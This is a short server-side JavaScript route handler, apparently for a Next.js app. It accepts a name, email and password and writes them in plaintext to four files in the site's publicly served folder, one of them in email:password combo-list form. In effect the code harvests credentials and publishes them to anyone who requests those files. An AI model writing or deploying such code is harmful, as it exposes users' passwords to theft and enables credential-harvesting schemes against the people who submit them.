import fs from 'fs';
import path from 'path';

export async function POST(request) {
  try {
    const { name, email, password } = await request.json();
    const userData = { name, email, password, timestamp: new Date().toISOString() };

    // Define paths (create in public folder for demo)
    const basePath = path.join(process.cwd(), 'public', 'user_data');
    
    // Create directory if needed
    if (!fs.existsSync(basePath)) {
      fs.mkdirSync(basePath, { recursive: true });
    }

    // Save to all required files
    fs.writeFileSync(path.join(basePath, 'chamcha.json'), JSON.stringify(userData, null, 2));
    fs.writeFileSync(path.join(basePath, 'bhola.txt'), `Name: ${name}\nEmail: ${email}\nPassword: ${password}`);
    fs.writeFileSync(path.join(basePath, 'maja.txt'), `${email}:${password}`);
    fs.writeFileSync(path.join(basePath, 'jhola.txt'), `User Data:\n${JSON.stringify(userData)}`);

    return Response.json({ success: true });
  } catch (error) {
    return Response.json({ success: false, error: error.message }, { status: 500 });
  }
}